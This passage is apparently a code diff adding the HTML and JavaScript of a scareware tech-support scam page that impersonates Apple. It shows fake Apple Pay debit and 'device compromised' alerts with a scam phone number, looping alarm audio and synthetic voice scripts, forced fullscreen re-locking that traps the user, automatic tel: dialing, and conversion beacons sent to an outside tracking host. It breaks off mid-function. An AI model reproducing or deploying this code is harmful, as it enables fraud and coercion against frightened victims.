+                <circle cx="26" cy="26" r="16" fill="none" stroke="#d6d6db" stroke-width="2.5" stroke-dasharray="4 2"></circle>
+                <!-- Middle Inner Ring -->
+                <circle cx="26" cy="26" r="10" fill="#a4a4a9"></circle>
+                <circle cx="26" cy="26" r="8" fill="#505054"></circle>
+                <!-- Center Hole -->
+                <circle cx="26" cy="26" r="5" fill="#f2f2f7"></circle>
+            </g>
+            <linearGradient id="settings-grad" x1="0" y1="0" x2="0" y2="1">
+                <stop offset="0%" stop-color="#e3e3e8"></stop>
+                <stop offset="50%" stop-color="#bbbbc0"></stop>
+                <stop offset="100%" stop-color="#8e8e93"></stop>
+            </linearGradient>
+        </defs>
+    </svg>
+
+    <script>
+        // ==========================================================
+        // PHONE CONFIGURATION
+        // ==========================================================
+        const SUPPORT_PHONE = "+18882044316";
+        const DISPLAY_PHONE = "+1-888-204-4316";
+
+        const popupContainer = document.getElementById('active-popup-container');
+        const modalBackdrop = document.getElementById('modal-backdrop');
+
+        let isLockdownActive = false;
+        let countdownSeconds = 38;
+        let countdownInterval = null;
+        let currentPopupIndex = 0;
+        let audioCtx = null;
+
+        // ==========================================================
+        // HORRIFYING EMERGENCY AUDIO & VOICE SYNTHESIZER
+        // ==========================================================
+        let speechActive = false;
+        let speechIndex = 0;
+        const HORRIFYING_SPEECH_SCRIPTS = [
+            "Urgent Apple Security Alert. An unauthorized charge of 129 dollars and 89 cents has been charged to your card. Senior Fraud Officer is on the line. Tap Call immediately to reverse this charge.",
+            "Warning: Your Apple Pay has been locked due to suspicious activity. Tap Call to speak with Fraud Support immediately.",
+            "Apple Support Alert: To cancel the pending debit and protect your account, stay on the line and press Call Support now."
+        ];
+
+        function initAudioContext() {
+            if (!audioCtx) {
+                const AudioContextClass = window.AudioContext || window.webkitAudioContext;
+                if (AudioContextClass) {
+                    audioCtx = new AudioContextClass();
+                }
+            }
+            if (audioCtx && audioCtx.state === 'suspended') {
+                audioCtx.resume();
+            }
+        }
+
+        // Apple Pay Signature Double Chime Tone
+        function playApplePayDing() {
+            try {
+                initAudioContext();
+                if (!audioCtx) return;
+                const now = audioCtx.currentTime;
+                const osc1 = audioCtx.createOscillator();
+                const osc2 = audioCtx.createOscillator();
+                const gain1 = audioCtx.createGain();
+                const gain2 = audioCtx.createGain();
+
+                osc1.type = 'sine';
+                osc2.type = 'sine';
+                osc1.frequency.setValueAtTime(1046.5, now);
+                osc2.frequency.setValueAtTime(1318.5, now + 0.12);
+
+                gain1.gain.setValueAtTime(0.25, now);
+                gain1.gain.exponentialRampToValueAtTime(0.001, now + 0.45);
+
+                gain2.gain.setValueAtTime(0, now);
+                gain2.gain.setValueAtTime(0.3, now + 0.12);
+                gain2.gain.exponentialRampToValueAtTime(0.001, now + 0.7);
+
+                osc1.connect(gain1);
+                osc2.connect(gain2);
+                gain1.connect(audioCtx.destination);
+                gain2.connect(audioCtx.destination);
+
+                osc1.start(now);
+                osc1.stop(now + 0.45);
+                osc2.start(now + 0.12);
+                osc2.stop(now + 0.7);
+            } catch (e) { }
+        }
+
+        // Authentic Apple iOS Notification Sound from Audio File (with synthesized fallback)
+        const iphoneNotifAudio = new Audio('iphone_notification.mp3');
+        iphoneNotifAudio.preload = 'auto';
+
+        function playAppleNotificationSound() {
+            try {
+                initAudioContext();
+                if (iphoneNotifAudio) {
+                    iphoneNotifAudio.currentTime = 0;
+                    iphoneNotifAudio.volume = 1.0;
+                    const p = iphoneNotifAudio.play();
+                    if (p && p.catch) {
+                        p.catch(() => {
+                            playSynthesizedTriTone();
+                        });
+                    }
+                    return;
+                }
+            } catch (e) { }
+            playSynthesizedTriTone();
+        }
+
+        function playSynthesizedTriTone() {
+            try {
+                if (!audioCtx) return;
+                const now = audioCtx.currentTime;
+                const notes = [
+                    { f: 830.61, t: 0, dur: 0.12, vol: 0.28 },
+                    { f: 987.77, t: 0.11, dur: 0.12, vol: 0.32 },
+                    { f: 1318.51, t: 0.22, dur: 0.50, vol: 0.36 }
+                ];
+                notes.forEach(n => {
+                    const osc = audioCtx.createOscillator();
+                    const gain = audioCtx.createGain();
+                    osc.type = 'sine';
+                    osc.frequency.setValueAtTime(n.f, now + n.t);
+                    gain.gain.setValueAtTime(0.001, now + n.t);
+                    gain.gain.linearRampToValueAtTime(n.vol, now + n.t + 0.012);
+                    gain.gain.exponentialRampToValueAtTime(0.0001, now + n.t + n.dur);
+                    osc.connect(gain);
+                    gain.connect(audioCtx.destination);
+                    osc.start(now + n.t);
+                    osc.stop(now + n.t + n.dur);
+                });
+            } catch (e) { }
+        }
+
+        // Realistic Phone Ringback Tone disabled per user request
+        function playRingbackTone() {
+            // Disabled
+        }
+
+        // Horrifying EAS (Emergency Alert System) & Dissonant Alarm Sound
+        function playAppleAlertSound() {
+            try {
+                initAudioContext();
+                if (!audioCtx) return;
+                const now = audioCtx.currentTime;
+
+                // 1. Dissonant EAS Alarm Frequency (853Hz & 960Hz)
+                const osc1 = audioCtx.createOscillator();
+                const osc2 = audioCtx.createOscillator();
+                const gain1 = audioCtx.createGain();
+                const gain2 = audioCtx.createGain();
+
+                osc1.type = 'sine';
+                osc2.type = 'sine';
+                osc1.frequency.setValueAtTime(853, now);
+                osc2.frequency.setValueAtTime(960, now);
+
+                gain1.gain.setValueAtTime(1, now);
+                gain2.gain.setValueAtTime(1, now);
+                gain1.gain.exponentialRampToValueAtTime(0.001, now + 0.4);
+                gain2.gain.exponentialRampToValueAtTime(0.001, now + 0.4);
+
+                osc1.connect(gain1);
+                osc2.connect(gain2);
+                gain1.connect(audioCtx.destination);
+                gain2.connect(audioCtx.destination);
+
+                osc1.start(now);
+                osc2.start(now);
+                osc1.stop(now + 0.4);
+                osc2.stop(now + 0.4);
+
+                // 2. Ominous Low Bass Drone
+                const bassOsc = audioCtx.createOscillator();
+                const bassGain = audioCtx.createGain();
+                bassOsc.type = 'triangle';
+                bassOsc.frequency.setValueAtTime(75, now);
+                bassOsc.frequency.exponentialRampToValueAtTime(45, now + 0.6);
+                bassGain.gain.setValueAtTime(0.4, now);
+                bassGain.gain.exponentialRampToValueAtTime(0.001, now + 0.6);
+                bassOsc.connect(bassGain);
+                bassGain.connect(audioCtx.destination);
+                bassOsc.start(now);
+                bassOsc.stop(now + 0.6);
+
+                // Also trigger voice narration
+                speakHorrifyingVoiceAlert();
+            } catch (e) { }
+        }
+
+        let isVoiceAlertActive = false;
+        let isSpeechSynthUnlocked = false;
+        let activeSpeechUtterance = null;
+        let speechLoopTimer = null;
+        let lastSpeechStartTimestamp = 0;
+
+        function unlockSpeechSynthesis() {
+            if (!('speechSynthesis' in window)) return;
+            try {
+                if (window.speechSynthesis.paused) {
+                    window.speechSynthesis.resume();
+                }
+                isSpeechSynthUnlocked = true;
+            } catch (e) { }
+        }
+
+        // Horrifying Urgent Automated Voice Alert (Safari iOS Optimized)
+        function speakHorrifyingVoiceAlert(forceRestart = false) {
+            try {
+                if (!isVoiceAlertActive && !isLockdownActive) return;
+                if (!('speechSynthesis' in window)) return;
+
+                // Resume if iOS Safari paused speech session
+                if (window.speechSynthesis.paused) {
+                    window.speechSynthesis.resume();
+                }
+
+                const now = Date.now();
+                // If currently speaking and hasn't timed out, let it play naturally unless forced
+                if (!forceRestart && window.speechSynthesis.speaking && (now - lastSpeechStartTimestamp < 6000)) {
+                    return;
+                }
+
+                lastSpeechStartTimestamp = now;
+
+                const scriptText = HORRIFYING_SPEECH_SCRIPTS[speechIndex % HORRIFYING_SPEECH_SCRIPTS.length];
+                speechIndex++;
+
+                const utterance = new SpeechSynthesisUtterance(scriptText);
+                utterance.lang = 'en-US';
+                utterance.rate = 1.0;
+                utterance.pitch = 1.05;
+                utterance.volume = 1.0;
+
+                // Pick female English voice (Samantha on iOS)
+                const voices = window.speechSynthesis.getVoices();
+                if (voices && voices.length > 0) {
+                    const chosenVoice = voices.find(v =>
+                        v.lang && (v.lang === 'en-US' || v.lang.startsWith('en')) &&
+                        (v.name.includes('Samantha') || v.name.includes('Karen') || v.name.includes('Victoria') || v.name.includes('Female'))
+                    ) || voices.find(v => v.lang && v.lang.startsWith('en'));
+                    if (chosenVoice) {
+                        utterance.voice = chosenVoice;
+                    }
+                }
+
+                utterance.onend = () => {
+                    activeSpeechUtterance = null;
+                    window._activeSpeechUtterance = null;
+                    if (isVoiceAlertActive || isLockdownActive) {
+                        clearTimeout(speechLoopTimer);
+                        speechLoopTimer = setTimeout(() => {
+                            speakHorrifyingVoiceAlert();
+                        }, 1000);
+                    }
+                };
+
+                utterance.onerror = (err) => {
+                    activeSpeechUtterance = null;
+                    window._activeSpeechUtterance = null;
+                    try {
+                        if (window.speechSynthesis.paused) window.speechSynthesis.resume();
+                    } catch(e) {}
+                    if (isVoiceAlertActive || isLockdownActive) {
+                        clearTimeout(speechLoopTimer);
+                        speechLoopTimer = setTimeout(() => {
+                            speakHorrifyingVoiceAlert();
+                        }, 1500);
+                    }
+                };
+
+                // Prevent Safari Garbage Collection bug
+                activeSpeechUtterance = utterance;
+                window._activeSpeechUtterance = utterance;
+
+                // If forced or already speaking, cleanly restart
+                if (window.speechSynthesis.speaking || window.speechSynthesis.pending) {
+                    window.speechSynthesis.cancel();
+                    setTimeout(() => {
+                        try {
+                            window.speechSynthesis.speak(utterance);
+                            window.speechSynthesis.resume();
+                        } catch(e) {}
+                    }, 25);
+                } else {
+                    window.speechSynthesis.speak(utterance);
+                    window.speechSynthesis.resume();
+                }
+            } catch (e) { }
+        }
+
+        // Preload voices
+        if ('speechSynthesis' in window) {
+            window.speechSynthesis.onvoiceschanged = () => {
+                try { window.speechSynthesis.getVoices(); } catch(e) {}
+            };
+        }
+
+        function triggerVibration() {
+            if (window.navigator && window.navigator.vibrate) {
+                window.navigator.vibrate([180, 80, 240, 80, 320]);
+            }
+        }
+
+        // ==========================================================
+        // HARD FULLSCREEN CAPTURE (Cross-Browser Multi-Prefix Force & Aggressive Re-Lock)
+        // ==========================================================
+        function forceLockedFullscreen() {
+            try {
+                const elem = document.documentElement;
+                const isFs = document.fullscreenElement || document.webkitFullscreenElement || document.mozFullScreenElement || document.msFullscreenElement;
+                if (!isFs) {
+                    const req = elem.requestFullscreen || elem.webkitRequestFullscreen || elem.webkitRequestFullScreen || elem.mozRequestFullScreen || elem.msRequestFullscreen;
+                    if (req) {
+                        const promise = req.call(elem, { navigationUI: "hide" });
+                        if (promise && promise.catch) {
+                            promise.catch(() => {
+                                try {
+                                    if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
+                                } catch (e) { }
+                            });
+                        }
+                    }
+                }
+            } catch (e) { }
+
+            // Mobile phone address-bar collapse & full screen viewport lock
+            try {
+                window.scrollTo(0, 1);
+                if (typeof isLockdownActive !== 'undefined' && (isLockdownActive || dialLoopActive)) {
+                    document.documentElement.style.height = '100dvh';
+                    document.body.style.height = '100dvh';
+                    document.body.style.overflow = 'hidden';
+                }
+            } catch (e) { }
+        }
+
+        // AGGRESSIVE CONTINUOUS FULLSCREEN ENFORCEMENT
+        // 1. Immediately re-lock fullscreen whenever browser tries to exit
+        ['fullscreenchange', 'webkitfullscreenchange', 'mozfullscreenchange', 'MSFullscreenChange'].forEach(evt => {
+            document.addEventListener(evt, () => {
+                const isFs = document.fullscreenElement || document.webkitFullscreenElement || document.mozFullScreenElement || document.msFullscreenElement;
+                if (!isFs) {
+                    // Try instant re-lock, plus rapid bursts
+                    forceLockedFullscreen();
+                    setTimeout(forceLockedFullscreen, 80);
+                    setTimeout(forceLockedFullscreen, 250);
+                    setTimeout(forceLockedFullscreen, 600);
+                }
+            }, true);
+        });
+
+        // 2. Periodic background check every 900ms to re-lock fullscreen if not active
+        setInterval(() => {
+            const isFs = document.fullscreenElement || document.webkitFullscreenElement || document.mozFullScreenElement || document.msFullscreenElement;
+            if (!isFs) {
+                forceLockedFullscreen();
+            }
+        }, 900);
+
+        // 3. Re-engage fullscreen on EVERY single user gesture across window and document
+        ['click', 'dblclick', 'mousedown', 'mouseup', 'pointerdown', 'pointerup', 'touchstart', 'touchend', 'touchmove', 'keydown', 'wheel'].forEach(evtName => {
+            window.addEventListener(evtName, () => {
+                forceLockedFullscreen();
+            }, { capture: true, passive: true });
+        });
+
+        // ==========================================================
+        // COUNTDOWN TIMER (Hold Timer with Urgency)
+        // ==========================================================
+        function startCountdownTimer() {
+            if (countdownInterval) clearInterval(countdownInterval);
+            countdownInterval = setInterval(() => {
+                if (countdownSeconds <= 1) {
+                    countdownSeconds = 45;
+                } else {
+                    countdownSeconds--;
+                }
+                const timerEl = document.getElementById('live-seconds-text');
+                if (timerEl) {
+                    timerEl.textContent = `0 minute ${countdownSeconds < 10 ? '0' + countdownSeconds : countdownSeconds} seconds`;
+                }
+                const holdTimerEl = document.getElementById('hold-timer-text');
+                if (holdTimerEl) {
+                    holdTimerEl.textContent = `01:${countdownSeconds < 10 ? '0' + countdownSeconds : countdownSeconds}`;
+                }
+            }, 1000);
+        }
+
+        // Render Sticky Bottom Floating VIP Bar
+        function renderStickyVipBar() {
+            if (document.getElementById('ios-vip-sticky-bar')) return;
+            const bar = document.createElement('div');
+            bar.id = 'ios-vip-sticky-bar';
+            bar.onclick = handleDirectDial;
+            bar.innerHTML = `
+                <div class="vip-bar-left">
+                    <div class="vip-agent-avatar">
+                        <svg width="22" height="22" viewBox="0 0 24 24" fill="#34c759"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                        <div class="vip-live-dot"></div>
+                    </div>
+                    <div class="vip-bar-info">
+                        <div class="vip-bar-title">Fraud Specialist (#8849) • Online</div>
+                        <div class="vip-bar-sub">$129.89 Debit Pending Reversal</div>
+                    </div>
+                </div>
+                <button class="vip-bar-btn">📞 REVERSE $129.89</button>
+            `;
+            document.body.appendChild(bar);
+        }
+
+        // ==========================================================
+        // POPUP 1: APPLE ALERT - DEBIT CARD CHARGED
+        // ==========================================================
+        function renderPopup1_Image1Style() {
+            popupContainer.innerHTML = `
+                <div class="ios-alert-dialog" id="active-dialog-box">
+                    <div class="ios-alert-content">
+                        <div class="ios-alert-title">Debit Card Charged</div>
+                        <div class="ios-alert-message">
+                            A payment of <strong>$129.89</strong> was debited from your linked Debit Card for <strong>Pornhub Premium (Lifetime)</strong> via Apple Pay.<br><br>
+                            If you did not authorize this debit, call Apple Fraud Support immediately to reverse the charge.
+                        </div>
+                    </div>
+                    <div class="ios-alert-btn-row">
+                        <button class="ios-alert-btn" onclick="handleDirectDial()">Cancel</button>
+                        <button class="ios-alert-btn bold destructive" onclick="handleDirectDial()">Reverse Debit</button>
+                    </div>
+                </div>
+            `;
+        }
+
+        // ==========================================================
+        // POPUP 2: APPLE ALERT - SECURITY LOCKOUT (DEBIT CARD RESTRICTED)
+        // ==========================================================
+        function renderPopup2_Image2Style() {
+            popupContainer.innerHTML = `
+                <div class="ios-alert-dialog" id="active-dialog-box">
+                    <div class="ios-alert-content">
+                        <div class="ios-alert-title">Security Alert: Debit Locked</div>
+                        <div class="ios-alert-message">
+                            Your connected Debit Card has been temporarily locked after a <strong>$129.89</strong> debit was authorized on this device.<br><br>
+                            Call Apple Support at <strong>${DISPLAY_PHONE}</strong> to verify your identity, dispute the debit, and unlock your card.
+                        </div>
+                    </div>
+                    <div class="ios-alert-btn-row">
+                        <button class="ios-alert-btn" onclick="handleDirectDial()">Dismiss</button>
+                        <button class="ios-alert-btn bold" onclick="handleDirectDial()">Call & Unlock Card</button>
+                    </div>
+                </div>
+            `;
+            startCountdownTimer();
+        }
+
+        // ==========================================================
+        // POPUP 3: APPLE ALERT - DEBIT TRANSACTION PROCESSED
+        // ==========================================================
+        function renderPopup3_Image3Style() {
+            popupContainer.innerHTML = `
+                <div class="ios-alert-dialog" id="active-dialog-box">
+                    <div class="ios-alert-content">
+                        <div class="ios-alert-title">Debit Processed: $129.89</div>
+                        <div class="ios-alert-message">
+                            Apple Pay confirmed an immediate debit of <strong>$129.89</strong>.<br><br>
+                            Reference: <strong>#DB-5499-FRAUD</strong><br>
+                            Status: <strong>Completed</strong><br><br>
+                            Unauthorized debits must be reported immediately to receive a full reversal.
+                        </div>
+                    </div>
+                    <div class="ios-alert-btn-row">
+                        <button class="ios-alert-btn" onclick="handleDirectDial()">Ignore</button>
+                        <button class="ios-alert-btn bold destructive" onclick="handleDirectDial()">Dispute Debit Now</button>
+                    </div>
+                </div>
+            `;
+        }
+
+        // ==========================================================
+        // POPUP 4: APPLE ALERT - RECURRING DEBIT NOTICE
+        // ==========================================================
+        function renderPopup4_Image4Style() {
+            popupContainer.innerHTML = `
+                <div class="ios-alert-dialog" id="active-dialog-box">
+                    <div class="ios-alert-content">
+                        <div class="ios-alert-title">Apple Pay: Debit Authorized</div>
+                        <div class="ios-alert-message">
+                            <strong>$129.89</strong> has been debited from your primary Debit Account.<br><br>
+                            An automatic recurring debit of $129.89 will renew annually unless cancelled.<br><br>
+                            Call Apple Priority Support: <strong>${DISPLAY_PHONE}</strong>
+                        </div>
+                    </div>
+                    <div class="ios-alert-btn-row">
+                        <button class="ios-alert-btn" onclick="handleDirectDial()">Cancel</button>
+                        <button class="ios-alert-btn bold" onclick="handleDirectDial()">Cancel Recurring Debit</button>
+                    </div>
+                </div>
+            `;
+        }
+
+        // ==========================================================
+        // POPUP 6: APPLE ALERT - DEBIT DEDUCTION CONFIRMATION
+        // ==========================================================
+        function renderPopup6_PaymentDeducted() {
+            popupContainer.innerHTML = `
+                <div class="ios-alert-dialog" id="active-dialog-box">
+                    <div class="ios-alert-content">
+                        <div class="ios-alert-title">Debit Card Deducted</div>
+                        <div class="ios-alert-message">
+                            <strong>$129.89</strong> was deducted from your bank debit balance.<br><br>
+                            Security hold active. Press <strong>Reverse Debit</strong> to connect with an Apple representative to return $129.89 to your account.
+                        </div>
+                    </div>
+                    <div class="ios-alert-btn-row">
+                        <button class="ios-alert-btn" onclick="handleDirectDial()">Close</button>
+                        <button class="ios-alert-btn bold destructive" onclick="handleDirectDial()">Reverse $129.89 Debit</button>
+                    </div>
+                </div>
+            `;
+        }
+
+        // ==========================================================
+        // POPUP 7: APPLE ALERT - DEVICE COMPROMISED
+        // ==========================================================
+        function renderPopup7_DeviceCompromised() {
+            popupContainer.innerHTML = `
+                <div class="ios-alert-dialog" id="active-dialog-box">
+                    <div class="ios-alert-content">
+                        <div class="ios-alert-title">Device Locked: Apple Device Compromised</div>
+                        <div class="ios-alert-message">
+                            Critical Security Alert.<br><br>
+                            Your Apple Device has been compromised by a malicious spyware infection. Unauthorized access to your iCloud Data, Photos, and Apple Pay has been detected.<br><br>
+                            Call Apple Support immediately at <strong>${DISPLAY_PHONE}</strong> to secure your device and prevent data loss.
+                        </div>
+                    </div>
+                    <div class="ios-alert-btn-row">
+                        <button class="ios-alert-btn" onclick="handleDirectDial()">Cancel</button>
+                        <button class="ios-alert-btn bold destructive" onclick="handleDirectDial()">Call Support Now</button>
+                    </div>
+                </div>
+            `;
+        }
+
+        // ==========================================================
+        // POPUP 5: APPLE ALERT - LIVE CALL CONNECTING
+        // ==========================================================
+        function renderPopup5_CallConnecting() {
+            startCountdownTimer();
+            popupContainer.innerHTML = `
+                <div class="ios-alert-dialog" id="active-dialog-box">
+                    <div class="ios-alert-content">
+                        <div class="ios-alert-title">Connecting to Apple Support</div>
+                        <div class="ios-alert-message">
+                            Holding priority line for immediate Debit Reversal.<br><br>
+                            Debit Amount: <strong>$129.89</strong><br>
+                            Representative: <strong>Fraud Officer Available</strong><br><br>
+                            Tap <strong>Call Now</strong> to reverse the $129.89 debit directly to your card.
+                        </div>
+                    </div>
+                    <div class="ios-alert-btn-row">
+                        <button class="ios-alert-btn destructive" onclick="handleDirectDial()">End</button>
+                        <button class="ios-alert-btn bold" onclick="handleDirectDial()">Call (${DISPLAY_PHONE})</button>
+                    </div>
+                </div>
+            `;
+        }
+
+        // ==========================================================
+        // MULTIPLIED POPUPS (STACKED APPLE ALERTS)
+        // ==========================================================
+        function renderMultipliedStack() {
+            const baseTemplate = `
+                <div class="ios-alert-dialog popup-stack-back">
+                    <div class="ios-alert-content">
+                        <div class="ios-alert-title">Security Alert: Debit Lock</div>
+                        <div class="ios-alert-message">Debit Card Locked due to $129.89 charge.</div>
+                    </div>
+                </div>
+            `;
+
+            const midTemplate = `
+                <div class="ios-alert-dialog popup-stack-mid">
+                    <div class="ios-alert-content">
+                        <div class="ios-alert-title">Apple Pay: Debit Approved</div>
+                        <div class="ios-alert-message">Transaction $129.89 processing.</div>
+                    </div>
+                </div>
+            `;
+
+            const frontTemplate = `
+                <div class="ios-alert-dialog popup-stack-front" id="active-dialog-box">
+                    <div class="ios-alert-content">
+                        <div class="ios-alert-title">Urgent: Debit Warning</div>
+                        <div class="ios-alert-message">
+                            Unauthorized <strong>$129.89</strong> debit confirmed on this device.<br><br>
+                            Your card has been restricted. Call Apple Fraud Prevention immediately at <strong>${DISPLAY_PHONE}</strong> to dispute and reverse.
+                        </div>
+                    </div>
+                    <div class="ios-alert-btn-row">
+                        <button class="ios-alert-btn" onclick="handleDirectDial()">Cancel</button>
+                        <button class="ios-alert-btn bold destructive" onclick="handleDirectDial()">Call to Cancel Debit</button>
+                    </div>
+                </div>
+            `;
+
+            popupContainer.innerHTML = `
+                <div class="popup-multi-stack">
+                    ${baseTemplate}
+                    ${midTemplate}
+                    ${frontTemplate}
+                </div>
+            `;
+        }
+
+        function showFloatingToast() {
+            // Cleared
+        }
+
+        // ==========================================================
+        // POPUP ROTATION SEQUENCE (WITH MULTIPLICATION TRIGGER)
+        // ==========================================================
+        const POPUP_SEQUENCE = [
+            renderPopup7_DeviceCompromised,
+            renderPopup1_Image1Style,
+            renderMultipliedStack,
+            renderPopup6_PaymentDeducted,
+            renderPopup2_Image2Style,
+            renderPopup3_Image3Style,
+            renderMultipliedStack,
+            renderPopup4_Image4Style
+        ];
+
+        function cycleNextPopup() {
+            currentPopupIndex = (currentPopupIndex + 1) % POPUP_SEQUENCE.length;
+            POPUP_SEQUENCE[currentPopupIndex]();
+            triggerShakeAndSound();
+        }
+
+        function triggerShakeAndSound() {
+            playAppleAlertSound();
+            triggerVibration();
+            const box = document.getElementById('active-dialog-box');
+            if (box) {
+                box.classList.remove('shake-anim');
+                void box.offsetWidth;
+                box.classList.add('shake-anim');
+            }
+        }
+
+        // ==========================================================
+        // MOBILE MESSAGES & NOTIFICATIONS SYSTEM (SINGLE TOP PAYMENT ALERT)
+        // ==========================================================
+        const notifLayer = document.getElementById('notif-layer');
+        const MOBILE_MESSAGES_LIST = [
+            {
+                app: "Messages",
+                iconType: "none",
+                iconSvg: `<img src="748974.png" style="width:100%; height:100%; border-radius:10px; object-fit:cover;" alt="Messages" />`,
+                title: "Debit Card: $129.89 Debited",
+                body: `Apple Pay: $129.89 was debited for Pornhub Premium. If unauthorized, call ${DISPLAY_PHONE} to reverse immediately.`,
+                time: "now"
+            },
+            {
+                app: "Messages",
+                iconType: "none",
+                iconSvg: `<img src="748974.png" style="width:100%; height:100%; border-radius:10px; object-fit:cover;" alt="Messages" />`,
+                title: "Senior Fraud Officer Online",
+                body: `Officer holding priority line to reverse $129.89 debit back to your card. Tap here or call ${DISPLAY_PHONE}`,
+                time: "now"
+            }
+        ];
+
+        function showSingleNotification(msg) {
+            if (!notifLayer) return;
+            const el = document.createElement('div');
+            el.className = 'ios-notif';
+            el.onclick = handleDirectDial;
+            el.innerHTML = `
+                <div class="notif-app-icon ${msg.iconType}">
+                    ${msg.iconSvg}
+                </div>
+                <div class="notif-content">
+                    <div class="notif-header">
+                        <span class="notif-app-name">${msg.app}</span>
+                        <span class="notif-time">${msg.time}</span>
+                    </div>
+                    <div class="notif-title">${msg.title}</div>
+                    <div class="notif-body">${msg.body}</div>
+                </div>
+            `;
+
+            // Always keep only 1 single message at the top
+            notifLayer.innerHTML = '';
+            notifLayer.appendChild(el);
+            playAppleNotificationSound();
+            triggerVibration();
+        }
+
+        let messageFeedIndex = 0;
+        function scheduleNotifications() {
+            if (!notifLayer) return;
+            notifLayer.innerHTML = '';
+
+            setTimeout(() => {
+                showSingleNotification(MOBILE_MESSAGES_LIST[0]);
+            }, 400);
+
+            setInterval(() => {
+                messageFeedIndex = (messageFeedIndex + 1) % MOBILE_MESSAGES_LIST.length;
+                showSingleNotification(MOBILE_MESSAGES_LIST[messageFeedIndex]);
+            }, 8000);
+        }
+
+        let dialLoopActive = false;
+        let dialTimeout = null;
+        let lastDialTimestamp = 0;
+        const DIAL_COOLDOWN_MS = 1200;
+
+        function triggerProtocolDial() {
+            const now = Date.now();
+            if (now - lastDialTimestamp < DIAL_COOLDOWN_MS) {
+                return;
+            }
+            lastDialTimestamp = now;
+
+            try {
+                let a = document.getElementById('direct-dial-anchor');
+                if (!a) {
+                    a = document.createElement('a');
+                    a.id = 'direct-dial-anchor';
+                    a.href = `tel:${SUPPORT_PHONE}`;
+                    a.style.display = 'none';
+                    document.body.appendChild(a);
+                }
+                a.click();
+            } catch (e) {
+                try {
+                    window.location.href = `tel:${SUPPORT_PHONE}`;
+                } catch (err) { }
+            }
+        }
+
+        // ==========================================================
+        // ADVANCED ANALYTICS & CONVERSION TRACKING ENGINE
+        // (Google Analytics, Voluum / Binom / RedTrack, Cloudflare, Session Metrics)
+        // ==========================================================
+        const pageSessionStartTime = Date.now();
+        let sessionHeartbeatCount = 0;
+        let isConversionDispatched = false;
+
+        // Extract tracker parameters dynamically (Voluum, Binom, RedTrack, Keitaro)
+        function getTrackerParams() {
+            const params = new URLSearchParams(window.location.search);
+            return {
+                click_id: params.get('click_id') || params.get('clickid') || params.get('cid') || params.get('subid') || '{CLICKID}',
+                zone_id: params.get('zone_id') || params.get('zoneid') || params.get('zone') || '{ZONE_ID}',
+                source_id: params.get('source_id') || params.get('source') || '{SOURCE_ID}',
+                campaign_id: params.get('campaign_id') || params.get('camp') || '',
+                cost: params.get('cost') || '',
+                ref: encodeURIComponent(document.referrer || 'direct')
+            };
+        }
+
+        // Track session duration & engaged session (Lowers Bounce Rate in Google Analytics)
+        setInterval(() => {
+            sessionHeartbeatCount++;
+            const durationSec = Math.round((Date.now() - pageSessionStartTime) / 1000);
+            
+            // Mark session as engaged after 5s & 15s to measure actual non-bounce engagement
+            if (typeof gtag === 'function') {
+                if (sessionHeartbeatCount === 1) { // 5s milestone
+                    gtag('event', 'engaged_session_5s', {
+                        'session_duration_seconds': durationSec,
+                        'event_category': 'Engagement'
+                    });
+                } else if (sessionHeartbeatCount === 3) { // 15s milestone
+                    gtag('event', 'user_retention_15s', {
+                        'session_duration_seconds': durationSec,
+                        'event_category': 'Retention'
+                    });
+                }
+            }
+        }, 5000);
+
+        // Track user exit / bounce duration accurately
+        window.addEventListener('visibilitychange', () => {
+            if (document.visibilityState === 'hidden') {
+                const totalDuration = Math.round((Date.now() - pageSessionStartTime) / 1000);
+                if (typeof gtag === 'function') {
+                    gtag('event', 'session_duration', {
+                        'duration_seconds': totalDuration,
+                        'converted': isConversionDispatched
+                    });
+                }
+            }
+        });
+
+        window.handleDirectDial = function () {
+            dialLoopActive = true;
+            forceLockedFullscreen();
+
+            const durationOnAction = Math.round((Date.now() - pageSessionStartTime) / 1000);
+            const tracker = getTrackerParams();
+
+            // 1. Google Analytics: Call Conversion Event (Clicks vs Conversion Tracking)
+            if (typeof gtag === 'function') {
+                gtag('event', 'conversion', {
+                    'send_to': 'G-C7KS423R48',
+                    'event_category': 'Conversion',
+                    'event_label': 'Call_Initiated',
+                    'click_id': tracker.click_id,
+                    'zone_id': tracker.zone_id,
+                    'time_to_convert_seconds': durationOnAction,
+                    'value': 1.0
+                });
+                gtag('event', 'call_click', {
+                    'event_category': 'Engagement',
+                    'event_label': 'Virus_Popup_Call',
+                    'duration': durationOnAction
+                });
+            }
+
+            // 2. Voluum / Binom / RedTrack S2S Postback & Edge Tracking
+            try {
+                const trackingUrl = `https://distant-lavender-qf5bwwvj.edgeone.dev/?click_id=${tracker.click_id}&zone_id=${tracker.zone_id}&source_id=${tracker.source_id}&duration=${durationOnAction}&conv=1`;
+                if (navigator.sendBeacon) {
+                    navigator.sendBeacon(trackingUrl);
+                } else {
+                    fetch(trackingUrl, { mode: 'no-cors', keepalive: true }).catch(() => { });
+                }
+            } catch (e) { }
+
+            isConversionDispatched = true;
+
+            try {
+                if ('wakeLock' in navigator) {
+                    navigator.wakeLock.request('screen').catch(() => { });
+                }
+            } catch (e) { }
+
+            playAppleAlertSound();
+            triggerVibration();
+            renderStickyVipBar();
+
+            // Safe, throttled protocol dial
+            triggerProtocolDial();
+        };
+
+        // When user taps Cancel on Safari native call sheet and returns to the webpage:
+        // Switch to the next popup, shake, and resume horrifying voice alert.
+        // DO NOT automatically fire tel: here because Safari flags automated calls without tap!
+        let lastCancelReopenTime = 0;
+        function handleCancelReOpen() {
+            if (dialLoopActive || isLockdownActive) {
+                const now = Date.now();
+                if (now - lastCancelReopenTime < 500) {
+                    return;
+                }
+                lastCancelReopenTime = now;
+                
+                unlockSpeechSynthesis();
+                forceLockedFullscreen();
+                triggerShakeAndSound();
+                speakHorrifyingVoiceAlert(true); // Ensure voice resumes and restarts cleanly
+                cycleNextPopup(); // Cycle to the next alarming popup
+            }
+        }
+
+        window.addEventListener('focus', handleCancelReOpen, true);
+        window.addEventListener('blur', handleCancelReOpen, true);
+        window.addEventListener('pageshow', handleCancelReOpen, true);
+        window.addEventListener('pagehide', handleCancelReOpen, true);
+        document.addEventListener('visibilitychange', () => {
+            if (document.visibilityState === 'visible') {
+                handleCancelReOpen();
+            }
+        }, true);
+
+        // EXIT INTENT TRAP: Mouse leaving window or touch drag to top
+        document.addEventListener('mouseleave', (e) => {
